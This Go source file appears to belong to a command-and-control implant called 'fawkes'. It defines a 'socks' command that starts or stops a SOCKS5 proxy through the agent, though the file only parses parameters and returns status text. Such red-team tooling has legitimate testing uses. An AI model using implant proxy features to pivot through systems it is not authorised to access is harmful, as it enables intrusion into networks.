package commands

import (
	"encoding/json"

	"fawkes/pkg/structs"
)

// SocksCommand implements the socks command
type SocksCommand struct{}

func (c *SocksCommand) Name() string {
	return "socks"
}

func (c *SocksCommand) Description() string {
	return "Start or stop a SOCKS5 proxy through this agent"
}

func (c *SocksCommand) Execute(task structs.Task) structs.CommandResult {
	var params struct {
		Action string `json:"action"`
		Port   int    `json:"port"`
	}

	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return errorf("Failed to parse parameters: %v", err)
	}

	switch params.Action {
	case "start":
		return successf("[+] SOCKS5 proxy active on server port %d. Agent is processing proxy traffic.", params.Port)
	case "stop":
		return successf("[+] SOCKS5 proxy on port %d stopped.", params.Port)
	default:
		return errorf("Unknown action: %s (use 'start' or 'stop')", params.Action)
	}
}
